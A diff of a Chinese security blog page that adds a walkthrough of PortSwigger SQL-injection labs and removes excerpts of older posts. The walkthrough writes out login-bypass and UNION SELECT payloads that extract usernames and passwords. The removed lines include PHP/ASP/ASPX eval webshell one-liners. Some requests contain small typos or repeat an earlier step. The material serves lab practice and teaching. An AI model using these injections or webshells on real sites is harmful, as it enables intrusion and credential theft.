@@ -6,15 +6,46 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://example.com">
-  <title>Solkatt的小窝</title>
+  <title>Burpsuit靶场练习之sql注入 | Solkatt的小窝</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Solkatt的小窝">
-<meta property="og:url" content="https://example.com/page/7/index.html">
+  <meta name="description" content="Burpsuite靶场介绍https:&#x2F;&#x2F;portswigger.net&#x2F;web-security是Burpsuite的官方网站，同时他也搭配了一个非常好的漏洞训练平台。以下简称该平台为Burpsuite学院。为什么称它为Burpsuite学院呢？因为其训练内容非常侧重于对Burpsuite各项功能的深入挖掘，这本身和创建该平台的初衷也是分不开的。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Burpsuit靶场练习之sql注入">
+<meta property="og:url" content="https://example.com/2022/10/19/Burpsuit%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Solkatt的小窝">
+<meta property="og:description" content="Burpsuite靶场介绍https:&#x2F;&#x2F;portswigger.net&#x2F;web-security是Burpsuite的官方网站，同时他也搭配了一个非常好的漏洞训练平台。以下简称该平台为Burpsuite学院。为什么称它为Burpsuite学院呢？因为其训练内容非常侧重于对Burpsuite各项功能的深入挖掘，这本身和创建该平台的初衷也是分不开的。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019153033499.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019153256614.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019153929332.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019154053451.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019154129189.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019154252615.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019154515170.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019154604992.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019155136366.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019155339722.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019160039416.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019160153689.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019160641807.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019160759993.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019161755299.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019162024441.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019162305523.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019163220996.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019163832944.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019164458667.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019164547736.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019165409889.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019165450818.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019165852057.png">
+<meta property="og:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019165918482.png">
+<meta property="article:published_time" content="2022-10-19T07:24:01.000Z">
+<meta property="article:modified_time" content="2022-10-19T11:21:00.551Z">
 <meta property="article:author" content="Solkatt">
+<meta property="article:tag" content="web安全的杂杂恋">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019153033499.png">
   
     <link rel="alternative" href="/atom.xml" title="Solkatt的小窝" type="application/atom+xml">
   
@@ -142,39 +173,116 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-    <article id="post-SSRF漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-Burpsuit靶场练习之sql注入" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/12/SSRF%E6%BC%8F%E6%B4%9E/">SSRF漏洞</a>
+    <h1 class="article-title" itemprop="name">
+      Burpsuit靶场练习之sql注入
     </h1>
   
 
         
-        <a href="/2021/08/12/SSRF%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
-  	<time datetime="2021-08-12T02:19:34.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-12</time>
+        <a href="/2022/10/19/Burpsuit%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2022-10-19T07:24:01.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-10-19</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>SSRF(Server-Side Request Forgery:<strong>服务器端请求伪造</strong>) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。<strong>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</strong></p>
-<p>SSRF的划分界限：</p>
-<ol>
-<li>只要能发起网络请求就是存在漏洞，因为有风险。</li>
-<li>只有访问到内网和本机（本机比内网更脆弱）才算存在SSRF。</li>
-</ol>
-<h2 id="CSRF与SSRF"><a href="#CSRF与SSRF" class="headerlink" title="CSRF与SSRF"></a>CSRF与SSRF</h2><p>CSRF跨站请求伪造，浏览器偷偷发包。</p>
-<p>SSRF你可以控制目标站点，往其他网站发包。</p>
-        
-          <a class="article-more-a" href="/2021/08/12/SSRF%E6%BC%8F%E6%B4%9E/#more">more >></a>
-        
+        <h1 id="Burpsuite靶场介绍"><a href="#Burpsuite靶场介绍" class="headerlink" title="Burpsuite靶场介绍"></a>Burpsuite靶场介绍</h1><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security%E6%98%AFBurpsuite%E7%9A%84%E5%AE%98%E6%96%B9%E7%BD%91%E7%AB%99%EF%BC%8C%E5%90%8C%E6%97%B6%E4%BB%96%E4%B9%9F%E6%90%AD%E9%85%8D%E4%BA%86%E4%B8%80%E4%B8%AA%E9%9D%9E%E5%B8%B8%E5%A5%BD%E7%9A%84%E6%BC%8F%E6%B4%9E%E8%AE%AD%E7%BB%83%E5%B9%B3%E5%8F%B0%E3%80%82%E4%BB%A5%E4%B8%8B%E7%AE%80%E7%A7%B0%E8%AF%A5%E5%B9%B3%E5%8F%B0%E4%B8%BABurpsuite%E5%AD%A6%E9%99%A2%E3%80%82%E4%B8%BA%E4%BB%80%E4%B9%88%E7%A7%B0%E5%AE%83%E4%B8%BABurpsuite%E5%AD%A6%E9%99%A2%E5%91%A2%EF%BC%9F%E5%9B%A0%E4%B8%BA%E5%85%B6%E8%AE%AD%E7%BB%83%E5%86%85%E5%AE%B9%E9%9D%9E%E5%B8%B8%E4%BE%A7%E9%87%8D%E4%BA%8E%E5%AF%B9Burpsuite%E5%90%84%E9%A1%B9%E5%8A%9F%E8%83%BD%E7%9A%84%E6%B7%B1%E5%85%A5%E6%8C%96%E6%8E%98%EF%BC%8C%E8%BF%99%E6%9C%AC%E8%BA%AB%E5%92%8C%E5%88%9B%E5%BB%BA%E8%AF%A5%E5%B9%B3%E5%8F%B0%E7%9A%84%E5%88%9D%E8%A1%B7%E4%B9%9F%E6%98%AF%E5%88%86%E4%B8%8D%E5%BC%80%E7%9A%84%E3%80%82">https://portswigger.net/web-security是Burpsuite的官方网站，同时他也搭配了一个非常好的漏洞训练平台。以下简称该平台为Burpsuite学院。为什么称它为Burpsuite学院呢？因为其训练内容非常侧重于对Burpsuite各项功能的深入挖掘，这本身和创建该平台的初衷也是分不开的。</a></p>
+<span id="more"></span>
+
+<h1 id="Burspuite靶场之SQL注入训练"><a href="#Burspuite靶场之SQL注入训练" class="headerlink" title="Burspuite靶场之SQL注入训练"></a>Burspuite靶场之SQL注入训练</h1><h2 id="检索隐藏数据"><a href="#检索隐藏数据" class="headerlink" title="检索隐藏数据"></a>检索隐藏数据</h2><h3 id="Where子句中检索隐藏数据"><a href="#Where子句中检索隐藏数据" class="headerlink" title="Where子句中检索隐藏数据"></a>Where子句中检索隐藏数据</h3><p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019153033499.png" alt="image-20221019153033499"></p>
+<p>打开试验场，随便进行抓包，发现了</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019153256614.png" alt="image-20221019153256614"></p>
+<p><code>Gifts关键字</code>。根据提示，直觉这里就是提示点。于是修改重放包，</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019153929332.png" alt="image-20221019153929332"></p>
+<p>浏览出所有商品，检索出隐藏数据。</p>
+<p>判断一个题目是否已经被解决，可以看网页右上角是否有已经解决的标志。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019154053451.png" alt="image-20221019154053451"></p>
+<h2 id="干扰逻辑"><a href="#干扰逻辑" class="headerlink" title="干扰逻辑"></a>干扰逻辑</h2><h3 id="SQL注入绕过登录"><a href="#SQL注入绕过登录" class="headerlink" title="SQL注入绕过登录"></a>SQL注入绕过登录</h3><p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019154129189.png" alt="image-20221019154129189"></p>
+<p>猜测这个直接是万能密码都能过，所以直接就提交Username:<code>admin&#39; or &#39;1&#39;=&#39;1&#39; -- qwe</code></p>
+<p>密码随便填写一个就可以了。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019154252615.png" alt="image-20221019154252615"></p>
+<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><h3 id="SQL联合注入，查出返回的列数。"><a href="#SQL联合注入，查出返回的列数。" class="headerlink" title="SQL联合注入，查出返回的列数。"></a>SQL联合注入，查出返回的列数。</h3><p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019154515170.png" alt="image-20221019154515170"></p>
+<p>使用burpsuite抓包</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019154604992.png" alt="image-20221019154604992"></p>
+<p>经过提醒是返回列数，所以我们可以使用两种方法猜测列数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1: &#x27; ORDER BY 1--</span><br><span class="line">2：&#x27; UNION SELECT NULL,NULL--</span><br></pre></td></tr></table></figure>
+
+<p>最后经过测试可以得出字段为3</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019155136366.png" alt="image-20221019155136366"></p>
+<h3 id="SQL联合注入，查找包含文本的列"><a href="#SQL联合注入，查找包含文本的列" class="headerlink" title="SQL联合注入，查找包含文本的列"></a>SQL联合注入，查找包含文本的列</h3><p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019155339722.png" alt="image-20221019155339722"></p>
+<p>先判断查询返回的列数，发现是三列：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Pets&#x27;UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>接下来可以通过将关键查询字填充去查询。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Pets&#x27;UNION+SELECT+NULL,&#x27;qU03xx&#x27;,NULL-- HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<h3 id="SQL联合查询，查找其他表数据"><a href="#SQL联合查询，查找其他表数据" class="headerlink" title="SQL联合查询，查找其他表数据"></a>SQL联合查询，查找其他表数据</h3><p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019160039416.png" alt="image-20221019160039416"></p>
+<p>注意看这道题的描述</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019160153689.png" alt="image-20221019160153689"></p>
+<p>仍然先确定列数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Pets&#x27;UNION+SELECT+NULL.NULL-- HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>判断两列的数据都可以显示，且为字符串类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Pets&#x27;UNION+SELECT+&#x27;11&#x27;,&#x27;21&#x27;-- HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019160641807.png" alt="image-20221019160641807"></p>
+<p>接下来就可以注入查询语句</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Pets&#x27;+UNION+SELECT+username,password+from+users-- HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019160759993.png" alt="image-20221019160759993"></p>
+<h3 id="SQL联合注入，从单个列中取出多个值。"><a href="#SQL联合注入，从单个列中取出多个值。" class="headerlink" title="SQL联合注入，从单个列中取出多个值。"></a>SQL联合注入，从单个列中取出多个值。</h3><p>仍然老步骤，先确定列数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Gifts&#x27;+UNION+SELECT+NULL,NULL-- HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p>为什么这道题要叫做从单个列取出多个值，因为该回显行只有一个</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019161755299.png" alt="image-20221019161755299"></p>
+<p>所以我们要想办法从一行中读取多个数据，这里可以实现数据拼接。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Pets&#x27;+UNION+SELECT+NULL,username||&#x27;~&#x27;||password+FROM+users-</span><br><span class="line">- HTTP/1.</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019162024441.png" alt="image-20221019162024441"></p>
+<h2 id="检索数据库"><a href="#检索数据库" class="headerlink" title="检索数据库"></a>检索数据库</h2><p>各种数据库查询版本命令：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019162305523.png" alt="image-20221019162305523"></p>
+<h3 id="查询Oracle数据库版本"><a href="#查询Oracle数据库版本" class="headerlink" title="查询Oracle数据库版本"></a>查询Oracle数据库版本</h3><p>在判断为两列后，确定字符型，并且利用Oracle的dual表做一些特定查询：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Pets&#x27;+UNION+SELECT+&#x27;123&#x27;,&#x27;321&#x27;+FROM+dual-- HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019163220996.png" alt="image-20221019163220996"></p>
+<p>PS:DUAL表是Oracle提供的最小的工作表，是sys用户下的一张内部表，所有用户都可以使用DUAL名称访问，无论什么时候这个表总是存在。</p>
+<p>接下来用ORACLE数据库查询语句查询数据库版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Pets&#x27;+UNION+SELECT+&#x27;123&#x27;,BANNER+FROM+v$version-- HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019163832944.png" alt="image-20221019163832944"></p>
+<h3 id="查询MYSQL和微软上的数据库类型和版本"><a href="#查询MYSQL和微软上的数据库类型和版本" class="headerlink" title="查询MYSQL和微软上的数据库类型和版本"></a>查询MYSQL和微软上的数据库类型和版本</h3><p>查询列数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Pets&#x27;+UNION+SELECT+1,3--+ HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019164458667.png" alt="image-20221019164458667"></p>
+<p>查询出结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Pets&#x27;+UNION+SELECT+1,@@version--+ HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019164547736.png" alt="image-20221019164547736"></p>
+<h2 id="查询数据库中内容"><a href="#查询数据库中内容" class="headerlink" title="查询数据库中内容"></a>查询数据库中内容</h2><h3 id="非Oracle数据库"><a href="#非Oracle数据库" class="headerlink" title="非Oracle数据库"></a>非Oracle数据库</h3><p>目标：该应用程序具有登录功能，数据库包含一个用户名和密码的表。我们需要确定该表的名称及 其包含的列，然后检索该表的内容以获取所有用户的用户名和密码。</p>
+<p>查找与用户相关的表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Gifts&#x27;+UNION+SELECT+&#x27;123&#x27;,table_name+from+information_schema.tables--+ HTTP/1.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019165409889.png" alt="image-20221019165409889"></p>
+<p>查找该表中的字段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Gifts&#x27;+UNION+SELECT+&#x27;123&#x27;,column_name+FROM+information_schema.columns+WHERE+table_name=&#x27;users_esdars&#x27;--+ HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019165450818.png" alt="image-20221019165450818"></p>
+<p>查找该表中字段的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Gifts&#x27;+UNION+SELECT+&#x27;123&#x27;,column_name+FROM+information_schema.columns+WHERE+table_name=&#x27;users_esdars&#x27;--+ HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019165852057.png" alt="image-20221019165852057"></p>
+<p>查找字段中信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /filter?category=Gifts&#x27;+UNION+SELECT+username_wnwldq,password_yggrtf+FROM+users_esdars--+ HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221019165918482.png" alt="image-20221019165918482"></p>
+
       
 
       
@@ -196,16 +304,75 @@
       
 
       
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/12/SSRF%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
-        </p>
-      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
+        </div>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=https://example.com/2022/10/19/Burpsuit%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0%E4%B9%8Bsql%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
       
       <div class="clearfix"></div>
     </div>
   </div>
 </article>
+
+  
+<nav id="article-nav">
+  
+  
+    <a href="/2022/10/14/%E5%85%8D%E6%9D%80Webshell/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">PHP下的几种免杀Webshell</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -225,673 +392,14 @@
 
 
 
-
-  
-    <article id="post-ctf中的一些序列化" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/07/ctf%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BA%8F%E5%88%97%E5%8C%96/">ctf中的一些序列化</a>
-    </h1>
-  
-
-        
-        <a href="/2021/08/07/ctf%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BA%8F%E5%88%97%E5%8C%96/" class="archive-article-date">
-  	<time datetime="2021-08-07T09:00:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-07</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="CTF中的序列化和反序列化"><a href="#CTF中的序列化和反序列化" class="headerlink" title="CTF中的序列化和反序列化"></a>CTF中的序列化和反序列化</h1><h2 id="序列化和反序列化概念"><a href="#序列化和反序列化概念" class="headerlink" title="序列化和反序列化概念"></a>序列化和反序列化概念</h2><p>序列化就是将对象转换成字符串。字符串包括 属性名 属性值 属性类型和该对象对应的类名</p>
-<p>反序列化则相反将字符串重新恢复成对象</p>
-<p>对象的序列化利于对象的保存和传输，也可以让多个文件共享对象</p>
-<h2 id="序列化中常见的魔法函数"><a href="#序列化中常见的魔法函数" class="headerlink" title="序列化中常见的魔法函数"></a>序列化中常见的魔法函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__construct() 创建对象时调用</span><br><span class="line">__destruct() 销毁对象时调用</span><br><span class="line">__toString() 当一个对象被当作一个字符串使用</span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line">__wakeup 将在序列化之后立即被调用</span><br></pre></td></tr></table></figure>
-        
-          <a class="article-more-a" href="/2021/08/07/ctf%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BA%8F%E5%88%97%E5%8C%96/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/08/07/ctf%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%BA%8F%E5%88%97%E5%8C%96/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-一句话木马" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/04/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/">一句话木马</a>
-    </h1>
-  
-
-        
-        <a href="/2021/08/04/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC/" class="archive-article-date">
-  	<time datetime="2021-08-04T03:01:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-04</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>一句话木马又被称为Webshell，是为了到目前web服务目录继而提权获得系统权限，不论asp，php，jsp，aspx都是如此，那么一句话木马到底是什么呢？</p>
-<p>最简单的一句话木马： <?php @eval($_POST['attack']);?></p>
-<p>基本原理为利用文件上传漏洞，往目标网站中上传一句话木马，然后就可以在本地通过软件获取和控制整个网站目录。@表示后面即使执行错误，也不报错。eval()函数表示括号内的语句字符串什么的全都当作代码执行。$_POST[‘attack’]表示从页面中获得attach这个参数值。</p>
-<h2 id="入侵条件"><a href="#入侵条件" class="headerlink" title="入侵条件"></a>入侵条件</h2><p>要实现入侵必须满足三个条件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）木马上传成功，未被杀；</span><br><span class="line">（2）知道木马的路径在哪；</span><br><span class="line">（3）上传的木马能正常运行。</span><br></pre></td></tr></table></figure>
-
-<h2 id="常见形式"><a href="#常见形式" class="headerlink" title="常见形式"></a>常见形式</h2><p>常见的一句话木马：</p>
-<p>php的一句话木马： <?php @eval($_POST['pass']);?><br>asp的一句话是：   &lt;%eval request (“pass”)%&gt;<br>aspx的一句话是：  &lt;%@ Page Language=”Jscript”%&gt; &lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;</p>
-<p>我们可以直接将这些语句插入到网站上的某个asp/aspx/php文件上，或者直接创建一个新的文件，在里面写入这些语句，然后把文件上传到网站上即可。</p>
-        
